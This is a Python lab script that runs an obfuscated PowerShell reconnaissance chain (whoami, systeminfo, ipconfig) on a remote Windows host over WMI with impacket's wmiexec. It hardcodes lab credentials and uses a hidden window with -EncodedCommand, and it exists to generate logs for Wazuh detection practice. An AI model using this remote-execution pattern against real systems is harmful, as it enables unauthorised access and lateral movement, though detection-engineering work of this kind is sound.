#!/usr/bin/env python3
"""
obfuscated_powershell_exec.py

Executes a base64 encoded PowerShell command chain (whoami, systeminfo, ipconfig)
on a remote Windows target over WMI, using impacket's wmiexec.py, to generate
Execution and Living off the Land style log data for detection engineering
practice in Wazuh.

Environment:
    Kali (attacker):      192.168.30.30
    Windows 11 (target):  192.168.20.20

For lab use only. Only run this against systems you own and control.
"""

import argparse
import base64
import csv
import subprocess
import sys
from datetime import datetime


def build_encoded_command(ps_command: str) -> str:
    """Base64 encode a PowerShell command the way -EncodedCommand expects, UTF-16LE."""
    return base64.b64encode(ps_command.encode("utf-16-le")).decode("utf-8")


def main():
    parser = argparse.ArgumentParser(
        description="Obfuscated PowerShell execution over WMI for the Wazuh Investigations lab"
    )
    parser.add_argument("--target", default="192.168.20.20",
                         help="Windows target IP, default 192.168.20.20")
    parser.add_argument("--username", default="Admin",
                         help="Account to authenticate with, default Admin")
    parser.add_argument("--password", default="44685",
                         help="Password for the account, default 44685")
    parser.add_argument("--log-file", default="obfuscated_powershell_log.csv",
                         help="CSV file to write the execution record to")
    args = parser.parse_args()

    ps_command = "whoami; systeminfo; ipconfig /all"
    encoded_command = build_encoded_command(ps_command)

    remote_command = (
        f"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden "
        f"-EncodedCommand {encoded_command}"
    )

    wmiexec_target = f"{args.username}:{args.password}@{args.target}"

    print(f"Target: {args.target}")
    print(f"Account: {args.username}")
    print(f"Plaintext PowerShell: {ps_command}")
    print(f"Encoded command: {encoded_command}\n")
    print("Executing over WMI via wmiexec.py...\n")

    timestamp = datetime.now().isoformat()
    output = ""
    error = ""
    status = "FAILURE"

    try:
        result = subprocess.run(
            ["wmiexec.py", wmiexec_target, remote_command],
            capture_output=True,
            text=True,
            timeout=60,
        )
        output = result.stdout.strip()
        error = result.stderr.strip()
        status = "SUCCESS" if result.returncode == 0 and output else "FAILURE"
    except FileNotFoundError:
        print("wmiexec.py was not found on PATH. Install impacket with pip3 install impacket.")
        sys.exit(1)
    except subprocess.TimeoutExpired:
        error = "Command timed out"

    print(output if output else "(no output captured)")
    if error:
        print(f"\nstderr: {error}")

    with open(args.log_file, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "target", "username", "plaintext_command", "encoded_command", "status"])
        writer.writerow([timestamp, args.target, args.username, ps_command, encoded_command, status])

    print(f"\nExecution record logged to {args.log_file}")


if __name__ == "__main__":
    main()